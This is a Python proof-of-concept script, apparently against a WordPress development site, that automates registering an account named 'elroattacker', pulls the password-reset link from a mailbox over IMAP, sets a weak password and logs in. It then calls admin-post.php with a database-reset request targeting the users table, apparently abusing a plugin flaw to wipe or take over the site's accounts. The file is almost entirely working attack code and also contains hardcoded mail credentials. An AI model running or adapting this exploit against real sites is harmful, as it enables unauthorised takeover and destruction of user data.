import imaplib
import threading
import time

import http_handler
import requests


def main():
    url = "https://elro.eliranm.co/dev1"
    s = requests.Session()
    s.cookies.clear()

    parameters = {'user_login': "elroattacker", 'user_email': "elro@elro.eliranm.co", 'wp-submit': 'Register',
                  'redirect_to': ''}
    s.post(url+"/wp-login.php?action=register", parameters)
    print("Sleeping")
    time.sleep(1)
    server = 'elro.eliranm.co'
    user = 'elro@elro.eliranm.co'
    password = 'elroWordpress'

    mail = imaplib.IMAP4_SSL(server)
    mail.login(user, password)
    mail.list()
    # Out: list of "folders" aka labels in gmail.
    mail.select("inbox")  # connect to inbox.
    result, data = mail.search(None, "ALL")

    ids = data[0]  # data is a list.
    id_list = ids.split()  # ids is a space separated string
    latest_email_id = id_list[-1]  # get the latest

    # fetch the email body (RFC822) for the given ID
    result, data = mail.fetch(latest_email_id, "(RFC822)")

    raw_email = data[0][1]  # here's the body, which is raw text of the whole email
    key = str(raw_email).split("/wp-login.php?action=rp&key=")[1].split("&login=elroattacker")[0]
    s.get(url+"/wp-login.php?action=rp&key="+key+"&login=elroattacker")
    parameters = {'pass1': "123456", 'pass1-text': "123456", 'pw_weak': 'on', 'action':'resetpass' ,
                  'pass2': '123456', 'rp_key': key, 'wp-submit': 'Reset Password'}
    response = s.post(url+"/wp-login.php?action=rp", parameters)
    print(response.headers)


    url = url+"/wp-login.php"
    parameters = {'log': "elroattacker", 'pwd': "123456", 'wp-submit': 'Login',
                  'testcookie': '1'}
    s = requests.Session()
    s.cookies.clear()
    s.headers.clear()
    s.proxies.clear()
    s.params.clear()
    time.sleep(1)
    s.post(url,parameters)
    r2 = s.get('https://elro.eliranm.co/dev1/wp-admin/admin-post.php?db-reset-tables%5B%5D=users&db-reset-code=11111&db-reset-code-confirm=11111')

if __name__ == '__main__':
    main()
